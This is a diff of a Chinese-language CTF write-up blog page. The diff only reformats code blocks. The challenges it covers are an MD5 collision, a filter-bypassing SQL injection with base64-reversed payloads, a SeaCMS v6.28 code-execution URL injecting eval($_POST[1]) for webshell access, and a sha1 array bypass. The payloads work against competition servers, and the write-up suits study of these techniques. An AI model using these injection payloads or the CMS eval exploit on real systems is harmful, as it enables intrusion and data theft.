 <p><code>flag{_2o!9_CTF_ECUN_}</code></p>
 <hr>
 <h3 id="第十题（76号）"><a href="#第十题（76号）" class="headerlink" title="第十题（76号）"></a>第十题（76号）</h3><p>Reverse</p>
@@ -232,45 +306,84 @@
 <p>按照文章步骤来，创建文本文件，写入1，命令为init.txt</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/11-2.png" alt="11-2"></p>
 <p>运行fastcoll 输入以下参数。 -p 是源文件 -o 是输出文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -p init.txt -o 1.txt 2.txt</span><br></pre></td></tr></table></figure>
-<p>文件生成</p>
+<pre><code>fastcoll_v1.0.0.5.exe -p init.txt -o 1.txt 2.txt
+</code></pre><p>文件生成</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/11-3.png" alt="11-3"></p>
 <p>通过下面这个代码，生成两个hash一样，但是实际内容不一样的字符串：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">readmyfile</span><span class="params">($path)</span></span>&#123;</span><br><span class="line">    $fh = fopen($path, <span class="string">"rb"</span>);</span><br><span class="line">    $data = fread($fh, filesize($path));</span><br><span class="line">    fclose($fh);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'二进制hash '</span>. md5( (readmyfile(<span class="string">"1.txt"</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'URLENCODE '</span>. urlencode(readmyfile(<span class="string">"1.txt"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'URLENCODE hash '</span>.md5(urlencode (readmyfile(<span class="string">"1.txt"</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'二进制hash '</span>.md5( (readmyfile(<span class="string">"2.txt"</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'URLENCODE '</span>.  urlencode(readmyfile(<span class="string">"2.txt"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'URLENCODE hash '</span>.md5( urlencode(readmyfile(<span class="string">"2.txt"</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php 
+function  readmyfile($path){
+    $fh = fopen($path, &quot;rb&quot;);
+    $data = fread($fh, filesize($path));
+    fclose($fh);
+    return $data;
+}
+echo &#39;二进制hash &#39;. md5( (readmyfile(&quot;1.txt&quot;)));
+echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;
+echo  &#39;URLENCODE &#39;. urlencode(readmyfile(&quot;1.txt&quot;));
+echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;
+echo &#39;URLENCODE hash &#39;.md5(urlencode (readmyfile(&quot;1.txt&quot;)));
+echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;
+echo &#39;二进制hash &#39;.md5( (readmyfile(&quot;2.txt&quot;)));
+echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;
+echo  &#39;URLENCODE &#39;.  urlencode(readmyfile(&quot;2.txt&quot;));
+echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;
+echo &#39;URLENCODE hash &#39;.md5( urlencode(readmyfile(&quot;2.txt&quot;)));
+echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;
+</code></pre>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/11-4.png" alt="11-4"></p>
 <p>然后直接POST提交param1和param2</p>
 <p>内容如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%8D%13%BE%8Fu%F7s%3B%60v%7E%BD%C46%B6%BA%CCyrer%F69%C84%2Az%92PB%97%ED%0D%09%AD%CD%DD%02%8C%A1%C7%CBG%D9%EF%F5%7C9%D5K%BAK%C6%C7N%3Be%93%F8P%5BH%27Qk%1Cr%80%9F-r%8D%0B%AC%D0aW%7F%13h+%7F%BCz%13%86F%AF%CB%1An%CB%EC%86%02%F0%0E%26%A6%D8%F6%D1%E3O%88%8C9w%C8%E4%C5f2%FA%ED%2B%02%E6%91%0E%CC%5C%9E%F4%EFzG%9B&amp;param2=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%8D%13%BE%8Fu%F7s%3B%60v%7E%BD%C46%B6%BA%CCyr%E5r%F69%C84%2Az%92PB%97%ED%0D%09%AD%CD%DD%02%8C%A1%C7%CBG%D9%EFu%7D9%D5K%BAK%C6%C7N%3Be%93%F8%D0%5BH%27Qk%1Cr%80%9F-r%8D%0B%AC%D0aW%7F%13h+%7F%BC%FA%13%86F%AF%CB%1An%CB%EC%86%02%F0%0E%26%A6%D8%F6%D1%E3O%88%8C9w%C8d%C5f2%FA%ED%2B%02%E6%91%0E%CC%5C%9Et%EFzG%9B</span><br></pre></td></tr></table></figure>
-<p>拿下flag</p>
+<pre><code>param1=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%8D%13%BE%8Fu%F7s%3B%60v%7E%BD%C46%B6%BA%CCyrer%F69%C84%2Az%92PB%97%ED%0D%09%AD%CD%DD%02%8C%A1%C7%CBG%D9%EF%F5%7C9%D5K%BAK%C6%C7N%3Be%93%F8P%5BH%27Qk%1Cr%80%9F-r%8D%0B%AC%D0aW%7F%13h+%7F%BCz%13%86F%AF%CB%1An%CB%EC%86%02%F0%0E%26%A6%D8%F6%D1%E3O%88%8C9w%C8%E4%C5f2%FA%ED%2B%02%E6%91%0E%CC%5C%9E%F4%EFzG%9B&amp;param2=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%8D%13%BE%8Fu%F7s%3B%60v%7E%BD%C46%B6%BA%CCyr%E5r%F69%C84%2Az%92PB%97%ED%0D%09%AD%CD%DD%02%8C%A1%C7%CBG%D9%EFu%7D9%D5K%BAK%C6%C7N%3Be%93%F8%D0%5BH%27Qk%1Cr%80%9F-r%8D%0B%AC%D0aW%7F%13h+%7F%BC%FA%13%86F%AF%CB%1An%CB%EC%86%02%F0%0E%26%A6%D8%F6%D1%E3O%88%8C9w%C8d%C5f2%FA%ED%2B%02%E6%91%0E%CC%5C%9Et%EFzG%9B
+</code></pre><p>拿下flag</p>
 <p><code>flag{MD5@_@success}</code></p>
 <hr>
 <h3 id="第十二题（梅津美治郎）"><a href="#第十二题（梅津美治郎）" class="headerlink" title="第十二题（梅津美治郎）"></a>第十二题（梅津美治郎）</h3><p>Reverse</p>
 <hr>
 <h3 id="第十三题（冈村宁次）"><a href="#第十三题（冈村宁次）" class="headerlink" title="第十三题（冈村宁次）"></a>第十三题（冈村宁次）</h3><p>题目的链接如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.103.43.235:83/web/a/index.php?id===QM</span><br></pre></td></tr></table></figure>
-<p>发现”id=”后面是奇怪的”==QM”。这其实是1经过base64加密后再逆序</p>
+<pre><code>http://47.103.43.235:83/web/a/index.php?id===QM
+</code></pre><p>发现”id=”后面是奇怪的”==QM”。这其实是1经过base64加密后再逆序</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/10-1.png" alt="10-1"></p>
 <p>测试发现，以下内容被检查，无法使用：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">extractvalue()函数，updatexml()函数</span><br><span class="line"></span><br><span class="line">union,select,空格,逗号,等号</span><br></pre></td></tr></table></figure>
-<p>应对策略：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">双写：uunionnion,sselectelect</span><br><span class="line">空格：使用/**/或者%09代替空格</span><br><span class="line">逗号：select()a join select ()b来代替逗号</span><br><span class="line">等号：like代替等号</span><br></pre></td></tr></table></figure>
-<p>爆表名：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">base64.b64encode(&quot;0 uunionnion/**/sselectelect/**/*/**/from/**/((sselectelect/**/database())a/**/join/**/(sselectelect/**/2)b/**/join/**/(sselectelect/**/3)c/**/join/**/(sselectelect/**/4)d/**/join/**/(sselectelect/**/5)e/**/join/**/(sselectelect/**/group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema/**/like/**/database())f)&quot;)[::-1]</span><br><span class="line"></span><br><span class="line">#表名：book,flag</span><br></pre></td></tr></table></figure>
-<p>爆列名：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">base64.b64encode(&quot;0/**/uunionnion/**/sselectelect/**/*/**/from/**/((sselectelect/**/database())a/**/join/**/(sselectelect/**/2)b/**/join/**/(sselectelect/**/3)c/**/join/**/(sselectelect/**/4)d/**/join/**/(sselectelect/**/5)e/**/join/**/(sselectelect/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name/**/like/**/0x666c6167)f)&quot;)[::-1]</span><br><span class="line"></span><br><span class="line">#列名：flag</span><br></pre></td></tr></table></figure>
-<p>爆flag值：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64.b64encode(&quot;0/**/uunionnion/**/sselectelect/**/*/**/from/**/((sselectelect/**/database())a/**/join/**/(sselectelect/**/2)b/**/join/**/(sselectelect/**/3)c/**/join/**/(sselectelect/**/4)d/**/join/**/(sselectelect/**/5)e/**/join/**/(sselectelect/**/flag/**/from/**/flag)f)&quot;)[::-1]</span><br></pre></td></tr></table></figure>
-<p><code>flag{s9li_1s_s0_e4sY}</code></p>
+<pre><code>extractvalue()函数，updatexml()函数
+
+union,select,空格,逗号,等号
+</code></pre><p>应对策略：</p>
+<pre><code>双写：uunionnion,sselectelect
+空格：使用/**/或者%09代替空格
+逗号：select()a join select ()b来代替逗号
+等号：like代替等号
+</code></pre><p>爆表名：</p>
+<pre><code>base64.b64encode(&quot;0 uunionnion/**/sselectelect/**/*/**/from/**/((sselectelect/**/database())a/**/join/**/(sselectelect/**/2)b/**/join/**/(sselectelect/**/3)c/**/join/**/(sselectelect/**/4)d/**/join/**/(sselectelect/**/5)e/**/join/**/(sselectelect/**/group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema/**/like/**/database())f)&quot;)[::-1]
+
+#表名：book,flag
+</code></pre><p>爆列名：</p>
+<pre><code>base64.b64encode(&quot;0/**/uunionnion/**/sselectelect/**/*/**/from/**/((sselectelect/**/database())a/**/join/**/(sselectelect/**/2)b/**/join/**/(sselectelect/**/3)c/**/join/**/(sselectelect/**/4)d/**/join/**/(sselectelect/**/5)e/**/join/**/(sselectelect/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name/**/like/**/0x666c6167)f)&quot;)[::-1]
+
+#列名：flag
+</code></pre><p>爆flag值：</p>
+<pre><code>base64.b64encode(&quot;0/**/uunionnion/**/sselectelect/**/*/**/from/**/((sselectelect/**/database())a/**/join/**/(sselectelect/**/2)b/**/join/**/(sselectelect/**/3)c/**/join/**/(sselectelect/**/4)d/**/join/**/(sselectelect/**/5)e/**/join/**/(sselectelect/**/flag/**/from/**/flag)f)&quot;)[::-1]
+</code></pre><p><code>flag{s9li_1s_s0_e4sY}</code></p>
 <hr>
 <h3 id="第十四题（作战计划）"><a href="#第十四题（作战计划）" class="headerlink" title="第十四题（作战计划）"></a>第十四题（作战计划）</h3><p>之前看过海洋CMS v6.28 存在代码执行漏洞，参考文章后，菜刀直接连接，密码为1：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.103.43.235:84/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[1])</span><br></pre></td></tr></table></figure>
-<p>根目录下直接看到flag.txt，打开后看到flag</p>
+<pre><code>http://47.103.43.235:84/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[1])
+</code></pre><p>根目录下直接看到flag.txt，打开后看到flag</p>
 <p><code>flag{!!seacms_@@}</code></p>
 <hr>
 <h3 id="第十五题（池步洲）"><a href="#第十五题（池步洲）" class="headerlink" title="第十五题（池步洲）"></a>第十五题（<strong>池步洲</strong>）</h3><p>查看源码，末尾提示着：index.phps，直接访问后下载到源码</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/15-1.png" alt="15-1"></p>
 <p>源码如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = <span class="string">'********'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span> ($_POST[<span class="string">'name'</span>] == $_POST[<span class="string">'password'</span>])</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'name and password must be diffirent'</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (sha1($_POST[<span class="string">'name'</span>]) === sha1($_POST[<span class="string">'password'</span>]))</span><br><span class="line">		<span class="keyword">die</span>($flag);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">print</span> <span class="string">'invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+$flag = &#39;********&#39;;
+if (isset($_POST[&#39;name&#39;]) and isset($_POST[&#39;password&#39;])){
+    if ($_POST[&#39;name&#39;] == $_POST[&#39;password&#39;])
+        print &#39;name and password must be diffirent&#39;;
+    else if (sha1($_POST[&#39;name&#39;]) === sha1($_POST[&#39;password&#39;]))
+        die($flag);
+    else print &#39;invalid password&#39;;
+}
+?&gt;
+</code></pre>
 <p>可以看出，要求我们POST的name和password值要不同，但是sha1()后的值要相同</p>
 <p>和md5()一样，sha1()无法处理数组，直接返回空，所以就是值一样了</p>
 <p>用Burpsuits提交，直接返回flag</p>
